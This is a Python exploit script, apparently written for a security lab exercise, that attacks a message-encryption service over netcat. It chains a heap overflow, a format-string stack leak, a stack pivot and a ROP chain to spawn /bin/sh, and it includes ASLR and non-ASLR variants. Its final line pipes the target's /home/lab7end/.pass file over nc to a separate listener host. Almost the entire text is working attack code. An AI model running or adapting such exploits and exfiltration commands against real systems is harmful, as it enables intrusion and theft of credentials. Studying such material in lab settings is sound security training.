import subprocess
from struct import pack
import binascii

#gadgets
inc_eax = pack('<I', 0x0807cd76)
int_80 = pack('<I', 0x08048ef6)
pop_ecx = pack('<I', 0x080e76ad)
pop_ebx = pack('<I', 0x080481c9)
xchg_eax_ebp = pack('<I', 0x08058ff8)
xchg_eax_esp = pack('<I', 0x0804bb6c)
xor_eax = pack('<I', 0x08055b40)

#libc addresses
print_f = pack("<I", 0x8050260)
scanf = pack("<I", 0x080502c0)

#non aslr adresses
#0x80f1af2
#0x80f1b3a
#0x80f1b46

m2_func_pointer = pack("<I", 0x80f1af2) #this is the address of our rop_chain
bin_sh_address = pack("<I", 0x80f1b3a)
zero_ecx_address = pack("<I", 0x80f1b46)

#Connect to the server on port 7714
sp = subprocess.Popen(["nc", "192.168.136.133", "7741"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

#offset = 201064
#helper functions
def send(data):
	sp.stdin.write(data)

def read_until(needle, proc):
	current = ""
	while needle not in current:
		current += proc.stdout.read(1)
	print current


read_until("Enter Choice:", sp)

#stage 1
send("1\n131\n")
read_until("-Enter data to encrypt:", sp)
send("A"*131 + "\n")
read_until("Enter Choice:", sp)

#stage 2
send("1\n1\n")
read_until("-Enter data to encrypt:", sp)
send("A"*1 + "\n")
read_until("Enter Choice:", sp)

#Stage 3: info leak
send("2\n")
read_until("-Input message index to edit:", sp)
send("0\n")
read_until("-Input new message to encrypt:", sp)
send("A"*140 + print_f + "%18$x" + "\x00" + "\n")
read_until("Enter Choice:", sp)


send("4\n1\n")
read_until("-Input message index to print:", sp)
leaked_stack = sp.stdout.read(14).strip(' ').strip('`').strip('\n').strip('\x02\x05\x08')
print leaked_stack
stack = int(leaked_stack, 16)
print stack


raw_input() #pause

#At this point we have two messages, the first has had its msg_len field overwritten with 0x00424242
#Now, when we edit m1, we can overflow the heap and overwrite the function pointer of m2
#The goal is to overwrite it with the address of scanf
#We then call scanf, and then use direct parameter access to overwrite the return address from main
#Just before main returns, we have user data in ebp, so we use two rop-gadgets to change esp to point to the heap 

                      #value in ebp     #swap eax,ebp   #stack pivot
stack_pivot = m2_func_pointer + xchg_eax_ebp + xchg_eax_esp  + "\x00"*4  #This string overwrites the return address from main and pivots to user data on the heap

#This rop chain runs /bin/sh, addresses such as "/bin/sh"  are found on the heap, no info leak needed
#NON-ASLR Exploit
#rop_chain = xor_eax + inc_eax*11 + pop_ebx + bin_sh_address + pop_ecx + zero_ecx_address + int_80 + pack("<I", 0xbffffc98)  + "/bin//sh" +"\x00"*4 + "\x00"*12

#aslr rop chain
rop_chain = pack('<I',stack) + xor_eax + inc_eax*11 + pop_ebx + pack('<I', stack+76) + pop_ecx + pack('<I', stack+84) + int_80 + pack("<I", 0xbffffc98)  + "/bin//sh" +"\x00"*4 + "\x00"*12

#Trigger the edit message overflow from m1 to m2, because of the way the input is buffered the order is a bit weird
#Took a while to figure out which order to edit a message and then trigger scanf in such a way as to send scanf data
#For some reason this whole exploit wouldn't work unless the sanf address was send before the stack pivot, I lucked out and accidentally had it there
#NON-ASLR Exploit
#send(("2\n0\n4\n1\n" + scanf + stack_pivot + "\n" + "5\n").ljust(4096, "\n"))                                             

#ASLR Exploit
send(("2\n0\n4\n1\n" + scanf + rop_chain + "\n" + "5\n").ljust(4096, "\n"))

#This is the actual overwrite of m2, when we trigger print_index of m2, we actually force a call to scanf("%18$s\n")
#The data that scanf reads is in the previous send call, from stack_pivot onwards.
#We also store our ropchain in m2
#NON ASLR Exploit
#send(("A"*140 + scanf + '%18$s\n' + rop_chain).ljust(257, '\x00')) 

#ASLR Exploit
send(("A"*140 + scanf + '%18$s\n').ljust(257, '\x00'))

read_until("Enter Choice:", sp)
read_until("Enter Choice:", sp)

x = raw_input() #pause 1 more time

#Viewing output from the process was a pain, so I used a netcat listener to send me the pass file
send("nc 192.168.136.128 4444 < /home/lab7end/.pass\n")
